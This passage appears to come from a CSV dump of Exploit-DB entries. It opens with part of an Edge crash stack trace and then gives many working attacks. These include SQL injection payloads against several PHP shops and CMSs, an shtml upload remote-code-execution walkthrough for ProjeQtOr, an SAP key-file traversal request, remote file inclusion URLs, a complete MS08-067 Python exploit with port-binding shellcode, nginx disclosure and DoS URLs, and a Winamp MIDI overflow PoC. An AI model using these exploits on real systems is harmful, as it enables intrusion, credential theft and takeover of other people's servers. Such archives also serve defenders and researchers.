0000004d`4482e770 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 c1 0000004d`4482e7b0 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 c2 0000004d`4482e930 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 c3 0000004d`4482e9b0 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a c4 0000004d`4482eb10 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 c5 0000004d`4482eb50 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 c6 0000004d`4482ee20 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 c7 0000004d`4482ee70 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 c8 0000004d`4482efe0 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 c9 0000004d`4482f020 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 ca 0000004d`4482f130 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d cb 0000004d`4482f290 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e cc 0000004d`4482f310 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a cd 0000004d`4482f340 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 ce 0000004d`4482f440 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 cf 0000004d`4482f480 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf d0 0000004d`4482f4c0 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 d1 0000004d`4482f4f0 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 d2 0000004d`4482f5d0 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 d3 0000004d`4482f6b0 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 d4 0000004d`4482f770 00007ffe`83cf90a3 0x000001fa`1cf7057e d5 0000004d`4482f800 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 d6 0000004d`4482f850 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 d7 0000004d`4482f8b0 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c d8 0000004d`4482f9a0 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 d9 0000004d`4482fa10 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 da 0000004d`4482fab0 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 db 0000004d`4482fb40 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac dc 0000004d`4482fbe0 00007ffe`84650b98 edgehtml!Ordinal107+0x77add dd 0000004d`4482fc30 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 de 0000004d`4482fc70 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 df 0000004d`4482fdf0 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 e0 0000004d`4482fe70 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a e1 0000004d`4482ffd0 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 e2 0000004d`44830010 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 e3 0000004d`448302e0 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 e4 0000004d`44830330 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 e5 0000004d`448304a0 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 e6 0000004d`448304e0 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 e7 0000004d`448305f0 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d e8 0000004d`44830750 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e e9 0000004d`448307d0 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a ea 0000004d`44830800 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 eb 0000004d`44830900 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 ec 0000004d`44830940 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf ed 0000004d`44830980 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 ee 0000004d`448309b0 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 ef 0000004d`44830a90 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 f0 0000004d`44830b70 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 f1 0000004d`44830c30 00007ffe`83cf90a3 0x000001fa`1cf7057e f2 0000004d`44830cc0 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 f3 0000004d`44830d10 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 f4 0000004d`44830d70 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c f5 0000004d`44830e60 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 f6 0000004d`44830ed0 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 f7 0000004d`44830f70 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 f8 0000004d`44831000 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac f9 0000004d`448310a0 00007ffe`84650b98 edgehtml!Ordinal107+0x77add fa 0000004d`448310f0 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 fb 0000004d`44831130 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 fc 0000004d`448312b0 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 fd 0000004d`44831330 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a fe 0000004d`44831490 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 ff 0000004d`448314d0 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 -->",Microsoft EdgeHTML,1
12442,"GeneShop 5.1.1 - SQL Injection # Vendor Link : http://softbizscripts.com/ # Version: Web Application # Tested on: Apcahe/Unix # Dork :  inurl:""browse.php?folder="" Powered by GeneShop 5 # Code : --------------------------------------------------------------------------------------- ############################################################################ #Greetz to all Andhra Hackers and ICW Memebers[Indian Cyber Warriors] #Thanks: SaiSatish,FB1H2S,Godwin_Austin,Micr0,Harin,Jappy,Dark_Blue,sid3^3f3c7 #Shoutz: hg_H@x0r,r45c4l,Yash,Hackuin,unn4m3d #Catch us at www.andhrahackers.com or www.teamicw.in ############################################################################   All Earlier Version also Vulnerable   Exploited Link :  http://example.com/[path]/browse.php?folder=1'    Demo :  http://example.com/[path]/browse.php?folder=-1+union+select+1,version(),3,4,5,6--   #41.w4r10r mailto:41.w4r10r@andhrahackers.com",GeneShop,1
6014,"SmartPPC Pay Per Click Script - 'idDirectory' Blind SQL Injection (1) +---------------------------------------+ |   Blind SQL Injection Vulnerability   | |      in  Pay Per Click Script         | |     found by Hamtaro aka CorVu5       | |there must be 50 ways to learn to hover| +---------------------------------------+   #gdork: ""Pay Per Click Script powered by SmartPPC.com.""   #vuln: site.com/directory.php?username=&idDirectory=90992%20and%20ascii(substring((SELECT%20concat(username,0x3a,pass)%20from%20users%20limit%200,1),1,1))%3E108   #login: site.com/accounts.php --------------------------------------- greetz Hamtaro aka CorVu5  # milw0rm.com [2008-07-07]",SmartPPC Pay Per Click Script,1
5914,"Demo4 CMS - 'id' SQL Injection ===============================================================   Demo4 CMS (index.php id) Remote SQL Injection Vulnerability ===============================================================     ,--^----------,--------,-----,-------^--,   | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..   `+---------------------------^----------|     `\_,-------, _________________________|       / XXXXXX /`|     /      / XXXXXX /  `\   /     / XXXXXX /\______(    / XXXXXX /              / XXXXXX /  (________(                `------'   AUTHOR : CWH Underground DATE   : 23 June 2008 SITE   : www.citec.us   #####################################################  APPLICATION : Demo4 CMS   VERSION     : Beta01  VENDOR      : N/A  DOWNLOAD    : http://downloads.sourceforge.net/demo4 #####################################################  --- Remote SQL Injection ---  -----------------------------  Vulnerable File [index.php] -----------------------------  @Line     8:  if ($_GET['id']=="""")    9:  $id = $startpage;   10:  else   11:  $id = $_GET['id'];   12:  database_connect();   13:  $query = ""SELECT * from content   14:         WHERE id = $id"";   15:  $error = mysql_error();  ---------  Exploit ---------  [+] http://[Target]/[demo4_path]/index.php?id=[SQL Injection]      **This exploits can get username and password (No Encryption)**  -------------  POC Exploit -------------  [+] http://192.168.24.25/demo4/index.php?id=-9999/**/UNION/**/SELECT/**/1,userid,3,4,password,username,7,8/**/FROM/**/pages_t_users   ################################################################## # Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  # ##################################################################  # milw0rm.com [2008-06-23]",Demo4 CMS,1
45680,"ProjeQtOr Project Management Tool 7.2.5 - Remote Code Execution # Exploit Title: ProjeQtOr Project Management Tool 7.2.5 - Remote Code Execution # Date: 2018-10-22 # Exploit Author: Özkan Mustafa Akkuş (AkkuS) # Contact: https://pentest.com.tr # Vendor Homepage: https://www.projeqtor.org # Software Link: https://sourceforge.net/projects/projectorria/files/projeqtorV7.2.5.zip/download # Version: v7.2.5 # Category: Webapps # Tested on: XAMPP for Linux 7.2.8-0 # CVE: CVE-2018-18924 # Description : ProjeQtOr PMT 7.2.5 and lower versions allows to upload arbitrary ""shtml"" files which # leads to a remote command execution on the remote server.  # 1) Create a file with the below HTML code and save it as .shtml  <html> <script> function fex() { document.location.href=""<!--#echo var=DOCUMENT_NAME -->?""+document.getElementById('komut').value; } </script> <!--#exec cmd=$output --> </html>  # 2) Login to ProjeQtOr portal as priviliage user # 3) You can perform this operation in the ckeditor fields. # 4) Click (Image) button on Content panel. # 5) Chose Upload section and browse your .shtml file. # 6) Click ""Send it to Server"". Script will give you ""This file is not a valid image."" error. # But it will send the file to the server. Just we need to find the file. # 7) We can read how the uploaded files are named in the # ""/tool/uploadImage.php"" file.(line 90)  <?php $fileName=date('YmdHis').'_'.getSessionUser()->id.'_'.$uploadedFile['name']; ?>  # 8) The name of our file should be;  Y = Years, numeric, at least 2 digits with leading 0 m = Months, numeric d = Days, numeric H = Hours, numeric, at least 2 digits with leading 0 i = Minutes, numeric s = Seconds, numeric  # We must save the date and time of the upload moment.  Formula : Y+m+d+H+i+s+_+UserID+_+filename = uploaded file name  # For Example; If you uploaded a file called ""RCE.shtml"" on 2018.10.23 at 01:02:30 # the file name will be ""20181023010230_1_RCE.shtml""  # 9) Finaly all uploaded images are sent under the ""/files/images/"" folder. # 10) Verift the exploit: http://domain/files/images/20181023010230_1_RCE.shtml?whoami  The request:  POST /tool/uploadImage.php?CKEditor=result&CKEditorFuncNum=80&langCode=en HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://localhost/view/main.php Cookie: projeqtor=cd3d5cf676e8598e742925cfd2343696; ckCsrfToken=7o1qC0Wtz7Z5QjiZ8cFuzc6yjnWdLjiHMeTalZ6n; PHPSESSID=bc0a9f0a918ccf0deae6de127d9b73e0 Connection: keep-alive Content-Type: multipart/form-data; boundary=---------------------------1783728277808111921873701375 Content-Length: 550 -----------------------------1783728277808111921873701375 Content-Disposition: form-data; name=""upload""; filename=""RCE.shtml"" Content-Type: text/html  [shtml file content] -----------------------------1783728277808111921873701375 Content-Disposition: form-data; name=""ckCsrfToken""  7o1qC0Wtz7Z5QjiZ8cFuzc6yjnWdLjiHMeTalZ6n -----------------------------1783728277808111921873701375--  HTTP/1.1 200 OK Date: Mon, 23 Oct 2018 01:02:30 GMT",ProjeQtOr Project Management Tool,1
39996,"SAP NetWeaver AS JAVA 7.1 < 7.5 - Directory Traversal Application: SAP NetWeaver AS JAVA  Versions Affected: SAP NetWeaver  AS JAVA 7.1 - 7.5  Vendor URL: http://SAP.com  Bug: Directory traversal  Sent:  29.09.2015  Reported: 29.09.2015  Vendor response: 30.09.2015  Date of Public Advisory: 08.03.2016  Reference: SAP Security Note 2234971  Author:         Vahagn Vardanyan  (ERPScan)     Description   1. ADVISORY INFORMATION  Title: [ERPSCAN-16-012] SAP NetWeaver AS Java directory traversal vulnerability  Advisory ID: [ERPSCAN-16-012]  Risk: medium  Advisory URL: https://erpscan.com/advisories/erpscan-16-012/  Date published: 08.03.2016  Vendors contacted: SAP   2. VULNERABILITY INFORMATION  Class: directory traversal  Impact: remotely read file from server  Remotely Exploitable: Yes  Locally Exploitable: No  CVE-2016-3976   CVSS Information  CVSS Base Score v3:  7.5  / 10  CVSS Base Vector:  AV : Attack Vector (Related exploit range) Network (N)  AC : Attack Complexity (Required attack complexity) Low (L)  PR : Privileges Required (Level of privileges needed to exploit) None (N)  UI : User Interaction (Required user participation) None (N)  S : Scope (Change in scope due to impact caused to components beyond the vulnerable component) Changed (C)  C : Impact to Confidentiality Low (L)  I : Impact to Integrity None (N)  A : Impact to Availability None (N)    3. VULNERABILITY DESCRIPTION  An authorized attacker can use a special request to read files from the server and then escalate his or her privileges.     4. VULNERABLE PACKAGES  SAP NetWeaver AS JAVA 7.1 - 7.5  Other versions are probably affected too, but they were not checked.   5. SOLUTIONS AND WORKAROUNDS  To correct this vulnerability, install SAP Security Note 2234971    6. AUTHOR  Vahagn Vardanyan  (ERPScan)    7. TECHNICAL DESCRIPTION  An attacker can use an SAP NetWeaver function CrashFileDownloadServlet to read files from the server.   PoC   GET /XXX/CrashFileDownloadServlet?fileName=..\security\data\SecStore.key   Disclaimer: According to the partnership agreement between ERPScan and SAP, our company is not entitled to publish any detailed information about detected vulnerabilities before SAP releases a patch. After the release, SAP suggests respecting an implementation time of three months and asks security researchers to not to reveal any details during this time. However, In this case, the vulnerability allows an attacker to read arbitrary files on a remote server, possibly disclosing confidential information, and many such services are exposed to the Internet. As responsible security researchers, ERPScan team made a decision not to disseminate the full PoC even after the specified time.    8. REPORT TIMELINE  Send: 29.09.2015  Reported: 29.09.2015  Vendor response: 30.09.2015  Date of Public Advisory: 08.03.2016     9. REFERENCES  https://erpscan.com/advisories/erpscan-16-012/   10. ABOUT ERPScan Research  The company’s expertise is based on the research subdivision of ERPScan, which is engaged in vulnerability research and analysis of critical enterprise applications. It has achieved multiple acknowledgments from the largest software vendors like SAP, Oracle, Microsoft, IBM, VMware, HP for discovering more than 400 vulnerabilities in their solutions (200 of them just in SAP!).  ERPScan researchers are proud to have exposed new types of vulnerabilities (TOP 10 Web Hacking Techniques 2012) and to be nominated for the best server-side vulnerability at BlackHat 2013.  ERPScan experts have been invited to speak, present, and train at 60+ prime international security conferences in 25+ countries across the continents. These include BlackHat, RSA, HITB, and private SAP trainings in several Fortune 2000 companies.  ERPScan researchers lead the project EAS-SEC, which is focused on enterprise application security research and awareness. They have published 3 exhaustive annual award-winning surveys about SAP security.  ERPScan experts have been interviewed by leading media resources and featured in specialized info-sec publications worldwide. These include Reuters, Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise, and Chinabyte, to name a few.  We have highly qualified experts in staff with experience in many different fields of security, from web applications and mobile/embedded to reverse engineering and ICS/SCADA systems, accumulating their experience to conduct the best SAP security research.    11. ABOUT ERPScan  ERPScan is the most respected and credible Business Application Security provider. Founded in 2010, the company operates globally and enables large Oil and Gas, Financial and Retail organizations to secure their mission-critical processes. Named as an ‘Emerging Vendor’ in Security by CRN, listed among “TOP 100 SAP Solution providers” and distinguished by 30+ other awards, ERPScan is the leading SAP SE partner in discovering and resolving security vulnerabilities. ERPScan consultants work with SAP SE in Walldorf to assist in improving the security of their latest solutions.  ERPScan’s primary mission is to close the gap between technical and business security, and provide solutions to evaluate and secure SAP and Oracle ERP systems and business-critical applications from both, cyber-attacks as well as internal fraud. Usually our clients are large enterprises, Fortune 2000 companies and managed service providers whose requirements are to actively monitor and manage security of vast SAP landscapes on a global scale.  We ‘follow the sun’ and function in two hubs, located in the Palo Alto and Amsterdam to provide threat intelligence services, agile support and operate local offices and partner network spanning 20+ countries around the globe.",SAP NetWeaver AS JAVA,1
38989,"Ovidentia bulletindoc Module 2.9 - Multiple Remote File Inclusions # Title: Ovidentia Module bulletindoc 2.9 Multiple Remote File Inclusion Vulnerabilities # Author: bd0rk # eMail: bd0rk[at]hackermail.com # Twitter: twitter.com/bd0rk # Tested on: Ubuntu-Linux # Download: http://www.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FAdd-ons%2FModules%2Fbulletindoc&file=bulletindoc-2-9.zip&idf=792  PoC1:  /bulletindoc-2-9/programs/admin.php line 2 ------------------------------------------------------  include $babInstallPath.""admin/acl.php"";  ------------------------------------------------------  [+]Sploit1: http://[s0me0ne]/bulletindoc-2-9/programs/admin.php?babInstallPath=[EviLCode]  Description: The $babInstallPath-parameter isn't declared before include.              So an attacker can execute evil-code 'bout this.    PoC2:  /bulletindoc-2-9/programs/main.php line 2 -------------------------------------------------------  require_once( $GLOBALS['babAddonPhpPath'].""fonctions.php"");  -------------------------------------------------------  [+]Sploit2: http://[s0me0ne/bulletindoc-2-9/programs/main.php?GLOBALS[babAddonPhpPath]=SHELLCODE?  Description: The problem is the same as the first. -.-              It's possible to compromise the system.  ### The 27 years old, german hacker bd0rk ###  Greetz: Kacper Szurek, High-Tech Bridge, rgod, LiquidWorm",Ovidentia bulletindoc Module,1
7132,"Microsoft Windows Server 2000/2003 - Code Execution (MS08-067) #!/usr/bin/env python ############################################################################# #   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled) #   www.hackingspirits.com #   www.coffeeandsecurity.com #   Email: d3basis.m0hanty @ gmail.com # # E-DB Note: Exploit Update ~ https://github.com/offensive-security/exploitdb/pull/77/files#diff-5247d21ae6747fa8543ef0ba9c06c0e2 #############################################################################  import struct import sys  from threading import Thread    #Thread is imported incase you would like to modify                                 #the src to run against multiple targets.  try:     from impacket import smb     from impacket import uuid     from impacket import dcerpc     from impacket.dcerpc.v5 import transport except ImportError, _:     print 'Install the following library to make this script work'     print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'     print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'     sys.exit(1)   print '#######################################################################' print '#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)' print '#   www.hackingspirits.com' print '#   www.coffeeandsecurity.com' print '#   Email: d3basis.m0hanty @ gmail.com' print '#######################################################################\n'   #Portbind shellcode from metasploit; Binds port to TCP port 4444 shellcode  = ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" shellcode += ""\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"" shellcode += ""\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"" shellcode += ""\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"" shellcode += ""\xa6\x52\x3d\xf6\xc9\x4b\x5d\xe0\x62\x7e\x3d\xa8\x07\x7b\x76\x30"" shellcode += ""\x45\xce\x76\xdd\xee\x8b\x7c\xa4\xe8\x88\x5d\x5d\xd2\x1e\x92\x81"" shellcode += ""\x9c\xaf\x3d\xf6\xcd\x4b\x5d\xcf\x62\x46\xfd\x22\xb6\x56\xb7\x42"" shellcode += ""\xea\x66\x3d\x20\x85\x6e\xaa\xc8\x2a\x7b\x6d\xcd\x62\x09\x86\x22"" shellcode += ""\xa9\x46\x3d\xd9\xf5\xe7\x3d\xe9\xe1\x14\xde\x27\xa7\x44\x5a\xf9"" shellcode += ""\x16\x9c\xd0\xfa\x8f\x22\x85\x9b\x81\x3d\xc5\x9b\xb6\x1e\x49\x79"" shellcode += ""\x81\x81\x5b\x55\xd2\x1a\x49\x7f\xb6\xc3\x53\xcf\x68\xa7\xbe\xab"" shellcode += ""\xbc\x20\xb4\x56\x39\x22\x6f\xa0\x1c\xe7\xe1\x56\x3f\x19\xe5\xfa"" shellcode += ""\xba\x19\xf5\xfa\xaa\x19\x49\x79\x8f\x22\xa7\xf5\x8f\x19\x3f\x48"" shellcode += ""\x7c\x22\x12\xb3\x99\x8d\xe1\x56\x3f\x20\xa6\xf8\xbc\xb5\x66\xc1"" shellcode += ""\x4d\xe7\x98\x40\xbe\xb5\x60\xfa\xbc\xb5\x66\xc1\x0c\x03\x30\xe0"" shellcode += ""\xbe\xb5\x60\xf9\xbd\x1e\xe3\x56\x39\xd9\xde\x4e\x90\x8c\xcf\xfe"" shellcode += ""\x16\x9c\xe3\x56\x39\x2c\xdc\xcd\x8f\x22\xd5\xc4\x60\xaf\xdc\xf9"" shellcode += ""\xb0\x63\x7a\x20\x0e\x20\xf2\x20\x0b\x7b\x76\x5a\x43\xb4\xf4\x84"" shellcode += ""\x17\x08\x9a\x3a\x64\x30\x8e\x02\x42\xe1\xde\xdb\x17\xf9\xa0\x56"" shellcode += ""\x9c\x0e\x49\x7f\xb2\x1d\xe4\xf8\xb8\x1b\xdc\xa8\xb8\x1b\xe3\xf8"" shellcode += ""\x16\x9a\xde\x04\x30\x4f\x78\xfa\x16\x9c\xdc\x56\x16\x7d\x49\x79"" shellcode += ""\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"" shellcode += ""\xba\xb5\x60\x56\x39\x4a\xb6\xa9""   #Payload for Windows 2000 target payload_1='\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00' payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41' payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41' payload_1+='\x41\x41' payload_1+='\x2f\x68\x18\x00\x8b\xc4\x66\x05\x94\x04\x8b\x00\xff\xe0' payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43' payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43' payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43' payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43' payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43' payload_1+='\xeb\xcc' payload_1+='\x00\x00'  #Payload for Windows 2003[SP2] target payload_2='\x41\x00\x5c\x00' payload_2+='\x2e\x00\x2e\x00\x5c\x00\x2e\x00' payload_2+='\x2e\x00\x5c\x00\x0a\x32\xbb\x77' payload_2+='\x8b\xc4\x66\x05\x60\x04\x8b\x00' payload_2+='\x50\xff\xd6\xff\xe0\x42\x84\xae' payload_2+='\xbb\x77\xff\xff\xff\xff\x01\x00' payload_2+='\x01\x00\x01\x00\x01\x00\x43\x43' payload_2+='\x43\x43\x37\x48\xbb\x77\xf5\xff' payload_2+='\xff\xff\xd1\x29\xbc\x77\xf4\x75' payload_2+='\xbd\x77\x44\x44\x44\x44\x9e\xf5' payload_2+='\xbb\x77\x54\x13\xbf\x77\x37\xc6' payload_2+='\xba\x77\xf9\x75\xbd\x77\x00\x00'   if sys.argv[2]=='1':    #Windows 2000 Payload     payload=payload_1     print '[-]Windows 2000 payload loaded' if sys.argv[2]=='2':    #Windows 2003[SP2] Payload     payload=payload_2     print '[-]Windows 2003[SP2] payload loaded'   class SRVSVC_Exploit(Thread):     def __init__(self, target, osver, port=445):         super(SRVSVC_Exploit, self).__init__()         self.__port   = port         self.target   = target         self.osver   = osver      def __DCEPacket(self):         print '[-]Initiating connection'         self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)         self.__trans.connect()         print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target         self.__dce = self.__trans.DCERPC_class(self.__trans)         self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))                  # Constructing Malicious Packet         self.__stub='\x01\x00\x00\x00'         self.__stub+='\xd6\x00\x00\x00\x00\x00\x00\x00\xd6\x00\x00\x00'         self.__stub+=shellcode         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'         self.__stub+='\x00\x00\x00\x00'         self.__stub+='\x2f\x00\x00\x00\x00\x00\x00\x00\x2f\x00\x00\x00'         self.__stub+=payload         self.__stub+='\x00\x00\x00\x00'         self.__stub+='\x02\x00\x00\x00\x02\x00\x00\x00'         self.__stub+='\x00\x00\x00\x00\x02\x00\x00\x00'         self.__stub+='\x5c\x00\x00\x00\x01\x00\x00\x00'         self.__stub+='\x01\x00\x00\x00'         return      def run(self):         self.__DCEPacket()         self.__dce.call(0x1f, self.__stub)   #0x1f (or 31)- NetPathCanonicalize Operation         print '[-]Exploit sent to target successfully...\n[1]Telnet to port 4444 on target machine...'  if __name__ == '__main__':        try:                target = sys.argv[1]                osver = sys.argv[2]        except IndexError:                print '\nUsage: %s <target ip> <os version>\n' % sys.argv[0]                print 'Example: srvsvcexpl.py 192.168.1.1 2\n'                print 'Select OS Version'                print '[-]Windows 2000: OS Version = 1'                print '[-]Windows 2003[SP2]: OS Version = 2'                 sys.exit(-1)  current = SRVSVC_Exploit(target, osver) current.start() #print '[-]Exploit sent to target successfully...\n[-]Telnet to port 4444 on target machine...'  # milw0rm.com [2008-11-16]",Microsoft Windows Server,1
13818,Nginx 0.8.36 - Source Disclosure / Denial of Service Issue 1: (Remote Source Disclosure) - Description -   nginx 0.8.36 is a multi platform HTTP server. This vulnerability exists in the latest Windows version of the application available.   nginx on Windows is vulnerable to a remote source disclosure attack.   - Technical Details - (Source Download)  http://[ webserver IP][:port]index.html::$DATA   Issue 2: (Remote DoS (w/ Memory Corruption)) - Description -  nginx 0.8.36 (Windows) does not seem to handle encoded directory traversal attempts properly. The corrupted registers in the crash dump seem to be loaded with damaged path variables.  - Technical Details - (Remote DoS)  http://[ webserver IP][:port]/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%20  http://[ webserver IP][:port]/%c0.%c0./%c0.%c0./%c0.%c0./%20  http://[ webserver IP][:port]/%c0.%c0./%c0.%c0./%20  These three attempts will overwrite memory registers with different parts of the internal path based on where they try and traverse to.,Nginx,1
44725,"Wecodex Store Paypal 1.0 - SQL Injection # Exploit Title: Wecodex Store Paypal 1.0 - SQL Injection # Dork: N/A # Date: 2018-05-23 # Exploit Author: Özkan Mustafa Akkuş (AkkuS) # Vendor Homepage: https://www.wecodex.com/item/view/online-store-system-with-paypal-sdk-in-php/9 # Version: 1.0 # Category: Webapps # Tested on: Kali linux # Description : PHP Dashboards is prone to an SQL-injection vulnerability # because it fails to sufficiently sanitize user-supplied data before using # it in an SQL query.Exploiting this issue could allow an attacker to # compromise the application, access or modify data, or exploit latent # vulnerabilities in the underlying database.  # PoC : SQLi : # Demo : https://Target  https://Target/signIn  POST /signIn HTTP/1.1 Host: Target User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: https://Target/login Content-Length: 23 Cookie: PHPSESSID=j89q1i6r4i1juosmihns9c1jo2 Connection: keep-alive id=admin&password=12345   # Vulnerable Payload : # Parameter: id (POST) # Type: boolean-based blind # Title: AND boolean-based blind - WHERE or HAVING clause # Payload:   id=admin' AND 9071=9071 AND 'gneN'='gneN&password=12345  # Type: AND/OR time-based blind # Title: MySQL >= 5.0.12 OR time-based blind # Payload:   id=admin' OR SLEEP(5) AND 'gXNU'='gXNU&password=12345",Wecodex Store Paypal,1
1935,"Winamp 5.21 - '.Midi' File Header Handling Buffer Overflow (PoC) /*    * ********************************************** *  * Winamp 5.21 - Midi Buffer Overflow in_midi.dll *  * ********************************************** *  * PoC coded by: BassReFLeX                       *  * Date: 19 Jun 2006                              *  * ********************************************** *   */  #include <stdio.h> #include <stdlib.h> #include <string.h>  void usage(char* file);  char header[] = ""\x4D\x54\x68\x64\x00\x00""                 ""\x00\x06\x00\x00\x00\x01""                 ""\x00\x60\x4D\x54\x72\x6B""                 ""\x00\x00"";  char badc0de[] = ""\xFF\xFF\xFF\xFF\xFF\xFF"" 		 ""\xFF\xFF\xFF\xFF\xFF\xFF""; 				 				  				  int main(int argc,char* argv[]) {     system(""cls"");     printf(""\n* ********************************************** *"");     printf(""\n* Winamp 5.21 - Midi Buffer Overflow in_midi.dll *"");     printf(""\n* ********************************************** *"");     printf(""\n* PoC coded by: BassReFLeX                       *"");     printf(""\n* Date: 19 Jun 2006                              *"");     printf(""\n* ********************************************** *"");          if ( argc!=2 )     {         usage(argv[0]);     }          FILE *f;     f = fopen(argv[1],""w"");     if ( !f )     {         printf(""\nFile couldn't open!"");         exit(1);     }                                   printf(""\n\nWriting crafted .mid file..."");     fwrite(header,1,sizeof(header),f);     fwrite(badc0de,1,sizeof(badc0de),f);     printf(""\nFile created successfully!"");     printf(""\nFile: %s"",argv[1]);     return 0; }          void usage(char* file) {     printf(""\n\n"");     printf(""\n%s <Filename>"",file);     printf(""\n\nFilename = .mid crafted file. Example: winsploit.exe 